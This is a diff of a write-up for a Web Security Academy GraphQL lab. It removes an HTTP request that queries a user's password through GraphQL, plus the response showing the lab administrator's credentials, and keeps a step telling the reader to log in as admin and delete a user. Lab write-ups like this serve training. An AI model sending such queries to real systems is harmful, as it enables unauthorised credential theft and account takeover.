@@ -72,38 +72,9 @@ query {
 }
 ```
 
+![GraphQL-lab-02](https://github.com/LinuxUser255/Web-Security-Academy-Series/assets/46334926/3cb75a77-9820-4dfa-a69f-f95c958973bf)
 
 
-
-#### Send the request:
-```HTTP
-POST /graphql/v1 HTTP/2
-Host: 0ad600ae033e31fd80d82b1400e00015.web-security-academy.net
-Content-Type: application/json
-Content-Length: 106
-
-{"query": "query {\n    getUser(id: 1) {\n        id\n        password\n
-username\n    }\n}"}
-```
-
-#### Response:
-```HTTP
-HTTP/2 200 OK
-Content-Type: application/json; charset=utf-8
-Set-Cookie: session=e9a9R3myvBcVw0i3kedeyUfpuxFYugB4; Secure; SameSite=None
-X-Frame-Options: SAMEORIGIN
-Content-Length: 133
-
-{
-  "data": {
-    "getUser": {
-      "id": 1,
-      "password": "avl5ht2slic29khwbtkz",
-      "username": "administrator"
-    }
-  }
-}
-```
 
 ### Now log in as the administrator, go to admin panel and delete carlos
 
